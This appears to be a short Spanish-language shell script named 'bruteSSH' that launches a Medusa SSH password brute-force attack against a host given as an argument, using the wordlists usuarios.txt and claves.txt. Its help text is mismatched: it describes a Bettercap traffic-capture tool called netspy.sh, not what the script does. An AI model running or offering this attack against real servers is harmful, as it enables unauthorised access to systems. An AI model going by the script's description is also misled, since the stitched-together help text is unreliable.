cat << "INFO"

bruteSSH

INFO
if [ -z "$1" ]; then
        echo 
        echo "Captura y muestra en pantalla el trafico."
        echo "Requiere Bettercap release >2.9"
        echo "Uso.: sh netspy.sh <interface>"
        echo 
        exit 0
fi
echo
echo
medusa -h $1 -U usuarios.txt -P claves.txt -M ssh
